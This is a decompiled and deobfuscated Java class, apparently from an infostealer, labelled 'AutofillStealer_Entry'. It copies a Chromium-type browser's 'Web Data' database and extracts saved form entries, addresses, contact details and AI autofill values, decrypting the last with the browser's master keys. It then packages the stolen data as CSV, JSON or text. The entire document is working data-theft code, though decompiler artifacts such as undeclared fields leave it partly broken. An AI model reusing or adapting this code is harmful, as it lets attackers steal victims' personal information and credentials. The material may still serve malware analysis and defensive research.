/* DEOBFUSCATED: AutofillStealer_Entry.java (inner class) */\n\n/*
 * Decompiled with CFR 0.152.
 */
package c;

import c.d;
import c.f;
import c.g;
import c.g$MasterKeys;
import c.r;
import c.u$Entry;
import java.io.File;
import java.io.IOException;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import org.json.JSONArray;

public final class u {
    public static final String CSV_HEADER = "Browser,Type,Label,Field,Value,Extra\n";
    private final List<u$Entry> b = new ArrayList<u$Entry>();
    private final String queryOverride;
    private final String tableOverride;

    public u(f f2) {
        this.c = f2.getBrowser().getInfo().getBrowserName();
        this.d = f2.getDirectory().getName();
        this.load(f2);
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    private void load(f f2) {
        if (f2.getBrowser().getInfo().isFirefox()) {
            return;
        }
        File file = new File(f2.getDirectory(), "Web Data" /* r.wd() */);
        if (!file.isFile()) {
            return;
        }
        File file2 = null;
        try {
            Class.forName("org.sqlite.JDBC");
        }
        catch (ClassNotFoundException classNotFoundException) {
            return;
        }
        try {
            file2 = c.d.copyToTemp(file);
            if (file2 == null || !file2.exists()) {
                return;
            }
            g$MasterKeys g$MasterKeys = f2.getBrowser().getMasterKeys();
            try (Connection connection = DriverManager.getConnection("jdbc:sqlite:" /* r.sq() */ + file2.getAbsolutePath());
                 Statement statement = connection.createStatement();){
                this.loadSimpleAutofill(statement);
                this.loadTokenProfiles(statement, "addresses", "address_type_tokens");
                this.loadTokenProfiles(statement, "local_addresses", "local_addresses_type_tokens");
                this.loadTokenProfiles(statement, "contact_info", "contact_info_type_tokens");
                this.loadLegacyProfiles(statement);
                this.loadAiAutofill(statement, g$MasterKeys);
            }
        }
        catch (IOException | SQLException exception) {
            System.err.println("Autofill load failed for " + this.c + "/" + this.d + ": " + exception.getMessage());
        }
        finally {
            if (file2 != null && file2.exists()) {
                file2.delete();
            }
        }
    }

    private void loadSimpleAutofill(Statement statement) throws SQLException {
        if (!u.tableExists(statement, "autofill")) {
            return;
        }
        try (ResultSet resultSet = statement.executeQuery("SELECT name, value, count, date_last_used FROM autofill");){
            while (resultSet.next()) {
                String string = resultSet.getString("name");
                String string2 = resultSet.getString("value");
                if (u.isBlank(string) && u.isBlank(string2)) continue;
                String string3 = "count=" + u.safe(resultSet.getString("count"), "1");
                try {
                    long l2 = resultSet.getLong("date_last_used");
                    if (l2 > 0L) {
                        string3 = string3 + ";last_used=" + l2;
                    }
                }
                catch (SQLException sQLException) {
                    // empty catch block
                }
                this.b.add(new u$Entry("form", "", u.safe(string, ""), u.safe(string2, ""), string3));
            }
        }
    }

    private void loadTokenProfiles(Statement statement, String string, String string2) throws SQLException {
        if (!u.tableExists(statement, string) || !u.tableExists(statement, string2)) {
            return;
        }
        HashMap<String, String> hashMap = new HashMap<String, String>();
        try (Object object = statement.executeQuery("SELECT guid, label FROM " + string);){
            while (object.next()) {
                hashMap.put(object.getString("guid"), u.safe(object.getString("label"), ""));
            }
        }
        object = "SELECT guid, type, value FROM " + string2;
        try (ResultSet resultSet = statement.executeQuery((String)object);){
            while (resultSet.next()) {
                String string3 = resultSet.getString("guid");
                int n2 = resultSet.getInt("type");
                String string4 = resultSet.getString("value");
                if (u.isBlank(string4)) continue;
                String string5 = hashMap.getOrDefault(string3, string3 != null ? string3 : "");
                this.b.add(new u$Entry("address", string5, u.fieldName(n2), string4, "guid=" + u.safe(string3, "")));
            }
        }
    }

    private void loadLegacyProfiles(Statement statement) throws SQLException {
        if (!u.tableExists(statement, "autofill_profiles")) {
            return;
        }
        String[] stringArray = new String[]{"company_name", "street_address", "dependent_locality", "city", "state", "zipcode", "sorting_code", "country_code", "date_modified", "origin", "language_code", "use_count", "use_date", "label"};
        HashSet<String> hashSet = new HashSet<String>();
        for (String string : stringArray) {
            if (!u.columnExists(statement, "autofill_profiles", string)) continue;
            hashSet.add(string);
        }
        if (hashSet.isEmpty()) {
            return;
        }
        StringBuilder stringBuilder = new StringBuilder("SELECT guid");
        for (String stringArray2 : stringArray) {
            if (!hashSet.contains(stringArray2)) continue;
            stringBuilder.append(", ").append(stringArray2);
        }
        stringBuilder.append(" FROM autofill_profiles");
        boolean bl = hashSet.contains("label");
        try (ResultSet resultSet = statement.executeQuery(stringBuilder.toString());){
            while (resultSet.next()) {
                String string = bl ? u.safe(resultSet.getString("label"), "") : "";
                for (String string2 : stringArray) {
                    String string3;
                    if (!hashSet.contains(string2) || u.isBlank(string3 = resultSet.getString(string2))) continue;
                    this.b.add(new u$Entry("profile", string, string2, string3, "guid=" + u.safe(resultSet.getString("guid"), "")));
                }
            }
        }
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    private void loadAiAutofill(Statement statement, g$MasterKeys g$MasterKeys) throws SQLException {
        Object object;
        String string;
        String string2;
        if (!u.tableExists(statement, "autofill_ai_entities") || !u.tableExists(statement, "autofill_ai_attributes")) {
            return;
        }
        HashMap<String, String> hashMap = new HashMap<String, String>();
        try (ResultSet resultSet = statement.executeQuery("SELECT guid, nickname, entity_type FROM autofill_ai_entities");){
            while (resultSet.next()) {
                string2 = resultSet.getString("guid");
                string = u.safe(resultSet.getString("nickname"), "");
                object = u.safe(resultSet.getString("entity_type"), "");
                hashMap.put(string2, (String)(string.isEmpty() ? object : string));
            }
        }
        resultSet = statement.executeQuery("SELECT entity_guid, attribute_type, field_type, value_encrypted FROM autofill_ai_attributes");
        try {
            while (resultSet.next()) {
                string2 = resultSet.getString("entity_guid");
                string = u.safe(resultSet.getString("attribute_type"), "attribute");
                object = resultSet.getBytes("value_encrypted");
                String string3 = u.decryptMaybe((byte[])object, g$MasterKeys);
                if (u.isBlank(string3)) continue;
                String string4 = string;
                try {
                    int n2 = resultSet.getInt("field_type");
                    if (n2 > 0) {
                        string4 = u.fieldName(n2);
                    }
                }
                catch (SQLException sQLException) {
                    // empty catch block
                }
                this.b.add(new u$Entry("ai", hashMap.getOrDefault(string2, string2), string4, string3, "guid=" + u.safe(string2, "")));
            }
        }
        finally {
            if (resultSet != null) {
                resultSet.close();
            }
        }
    }

    public String toCsvColumn() {
        return this.toCsvColumn(this.c);
    }

    public String toCsvColumn(String string) {
        StringBuilder stringBuilder = new StringBuilder();
        for (u$Entry u$Entry : this.b) {
            stringBuilder.append('\"').append(string).append("\",");
            stringBuilder.append(u$Entry.toCsvColumn());
        }
        return stringBuilder.toString();
    }

    public JSONArray toJsonArray() {
        JSONArray jSONArray = new JSONArray();
        for (u$Entry u$Entry : this.b) {
            jSONArray.put(u$Entry.toJson(this.c, this.d));
        }
        return jSONArray;
    }

    public String toTextFormat() {
        StringBuilder stringBuilder = new StringBuilder();
        for (u$Entry u$Entry : this.b) {
            if (!u.isBlank(u$Entry.a)) {
                stringBuilder.append("Type: ").append(u$Entry.a).append("\n");
            }
            if (!u.isBlank(u$Entry.b)) {
                stringBuilder.append("Label: ").append(u$Entry.b).append("\n");
            }
            stringBuilder.append("Name: ").append(u$Entry.c).append("\n").append("Value: ").append(u$Entry.d).append("\n");
            stringBuilder.append("\n");
        }
        return stringBuilder.toString();
    }

    public int getCount() {
        return this.b.size();
    }

    private static boolean tableExists(Statement statement, String string) throws SQLException {
        try (ResultSet resultSet = statement.executeQuery("SELECT 1 FROM sqlite_master WHERE type='table' AND name='" + string + "' LIMIT 1");){
            boolean bl;
            boolean bl2 = bl = resultSet.next();
            return bl2;
        }
    }

    private static boolean columnExists(Statement statement, String string, String string2) throws SQLException {
        try (ResultSet resultSet = statement.executeQuery("PRAGMA table_info(" + string + ")");){
            while (resultSet.next()) {
                boolean bl;
                if (!string2.equalsIgnoreCase(resultSet.getString("name"))) continue;
                boolean bl2 = bl = true;
                return bl2;
            }
        }
        return false;
    }

    private static String decryptMaybe(byte[] byArray, g$MasterKeys g$MasterKeys) {
        if (byArray == null || byArray.length == 0) {
            return "";
        }
        String string = g.decrypt(byArray, g$MasterKeys);
        return string != null ? string : "";
    }

    private static String fieldName(int n2) {
        switch (n2) {
            case 3: {
                return "NAME_FULL";
            }
            case 5: {
                return "NAME_FIRST";
            }
            case 6: {
                return "NAME_MIDDLE";
            }
            case 7: {
                return "NAME_LAST";
            }
            case 9: {
                return "NAME_MIDDLE_INITIAL";
            }
            case 14: {
                return "COMPANY_NAME";
            }
            case 30: {
                return "EMAIL";
            }
            case 31: {
                return "PHONE";
            }
            case 33: {
                return "ADDRESS_CITY";
            }
            case 34: {
                return "ADDRESS_STATE";
            }
            case 35: {
                return "ADDRESS_ZIP";
            }
            case 36: {
                return "ADDRESS_LINE1";
            }
            case 37: {
                return "ADDRESS_LINE2";
            }
            case 38: {
                return "ADDRESS_CITY";
            }
            case 39: {
                return "ADDRESS_STATE";
            }
            case 40: {
                return "ADDRESS_ZIP";
            }
            case 41: {
                return "ADDRESS_COUNTRY";
            }
            case 60: {
                return "USERNAME";
            }
            case 61: {
                return "PASSWORD";
            }
        }
        return "FIELD_" + n2;
    }

    private static boolean isBlank(String string) {
        return string == null || string.trim().isEmpty();
    }

    private static String safe(String string, String string2) {
        return string != null ? string : string2;
    }
}

